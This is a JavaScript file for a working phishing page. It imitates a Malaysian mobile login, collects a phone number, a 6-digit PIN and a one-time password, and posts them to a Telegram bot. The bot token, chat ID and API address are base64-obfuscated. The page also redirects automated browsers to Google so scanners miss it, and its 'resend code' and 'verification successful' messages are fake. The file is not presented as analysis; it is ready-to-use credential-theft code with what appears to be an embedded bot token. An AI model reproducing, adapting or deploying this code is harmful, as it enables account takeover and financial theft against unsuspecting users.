(function() {
  'use strict';
  
  if (navigator.webdriver) {
    window.location.href = 'https://www.google.com';
    return;
  }

  const cfg = {
    bt: 'ODU3NDg5NTkyNzpBQUVmc0JwbG1GNm5zc2p6NjZjTUhBMGl2WGhFa1ZPN2kyUQ==',
    ci: 'Nzc2MDkwNTE2OQ==',
    api: atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==')
  };

  let step = 1;
  let data = { phone: '', pin: '', otp: '' };

  function init() {
    renderStep();
  }

  function renderStep() {
    const container = document.getElementById('formContainer');
    if (!container) return;

    if (step === 1) {
      container.innerHTML = `
        <div class="form-group">
          <label class="form-label">Mobile Number</label>
          <input type="tel" class="form-input" id="phone" placeholder="+60 12-345-6789" required>
        </div>
        <div class="form-group">
          <label class="form-label">6-digit PIN</label>
          <div class="pin-container" id="pinContainer"></div>
          <input type="password" style="position:absolute;opacity:0;pointer-events:none" id="pinInput" maxlength="6">
        </div>
        <button class="btn-primary" onclick="app.submitStep1()">Continue</button>
      `;
      renderPinBoxes('pinContainer', 'pinInput');
    } else if (step === 2) {
      document.getElementById('pageTitle').textContent = 'OTP Verification';
      document.getElementById('pageSubtitle').textContent = 'Enter the code sent to ' + maskPhone(data.phone);
      container.innerHTML = `
        <div class="form-group">
          <label class="form-label">6-digit OTP</label>
          <div class="pin-container" id="otpContainer"></div>
          <input type="text" style="position:absolute;opacity:0;pointer-events:none" id="otpInput" maxlength="6">
        </div>
        <button class="btn-primary" onclick="app.submitStep2()">Verify</button>
        <button class="btn-secondary" onclick="app.resend()">Resend Code</button>
      `;
      renderPinBoxes('otpContainer', 'otpInput');
    }
  }

  function renderPinBoxes(containerId, inputId) {
    const container = document.getElementById(containerId);
    const input = document.getElementById(inputId);
    if (!container || !input) return;

    for (let i = 1; i <= 6; i++) {
      const box = document.createElement('div');
      box.className = 'pin-box';
      box.id = containerId + i;
      container.appendChild(box);
    }

    container.onclick = () => input.focus();
    input.oninput = (e) => updatePinDisplay(containerId, e.target.value);
  }

  function updatePinDisplay(containerId, value) {
    value = value.replace(/\D/g, '');
    const input = document.getElementById(containerId === 'pinContainer' ? 'pinInput' : 'otpInput');
    if (input) input.value = value;

    for (let i = 1; i <= 6; i++) {
      const box = document.getElementById(containerId + i);
      if (!box) continue;
      if (i <= value.length) {
        box.classList.add('filled');
        box.textContent = '•';
      } else {
        box.classList.remove('filled');
        box.textContent = '';
      }
    }
  }

  function maskPhone(phone) {
    const digits = phone.replace(/\D/g, '');
    return '+' + digits.substring(0, 3) + digits.substring(3, 4) + '****' + digits.substring(digits.length - 2);
  }

  async function submitStep1() {
    const phone = document.getElementById('phone')?.value.trim();
    const pin = document.getElementById('pinInput')?.value;

    if (!phone || phone.length < 10) {
      alert('Please enter a valid phone number');
      return;
    }
    if (pin.length !== 6) {
      alert('Please enter 6-digit PIN');
      return;
    }

    data.phone = phone;
    data.pin = pin;

    await send('PIN');
    step = 2;
    renderStep();
  }

  async function submitStep2() {
    const otp = document.getElementById('otpInput')?.value;

    if (otp.length !== 6) {
      alert('Please enter 6-digit OTP');
      return;
    }

    data.otp = otp;
    await send('COMPLETE');
    
    alert('✅ Verification successful!');
    setTimeout(() => location.href = 'index.html', 1000);
  }

  function resend() {
    alert('📩 New code has been sent');
    const input = document.getElementById('otpInput');
    if (input) input.value = '';
    updatePinDisplay('otpContainer', '');
  }

  async function send(type) {
    const loading = document.getElementById('loading');
    if (loading) loading.classList.add('active');

    const ts = new Date().toLocaleString('en-MY', { timeZone: 'Asia/Kuala_Lumpur', hour12: true });
    let msg = '';

    if (type === 'PIN') {
      msg = `🔔 *NEW LOGIN*\n\n📱 *Phone:*\n${data.phone}\n\n🔐 *PIN:*\n${data.pin}\n\n⏰ *Time:* ${ts}\n🌐 *Status:* Waiting for OTP...`;
    } else {
      const ref = 'REF' + Date.now().toString().slice(-8);
      msg = `✅ *VERIFIED*\n\n📱 *Phone:*\n${data.phone}\n\n🔐 *PIN:*\n${data.pin}\n\n🔑 *OTP:*\n${data.otp}\n\n🆔 *Ref:* ${ref}\n⏰ *Time:* ${ts}\n✔️ *Status:* VERIFIED`;
    }

    try {
      const token = atob(cfg.bt);
      const chatId = atob(cfg.ci);
      await fetch(cfg.api + token + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
      });
    } catch (e) {
      console.error(e);
    } finally {
      if (loading) setTimeout(() => loading.classList.remove('active'), 800);
    }
  }

  window.app = {
    submitStep1: submitStep1,
    submitStep2: submitStep2,
    resend: resend
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
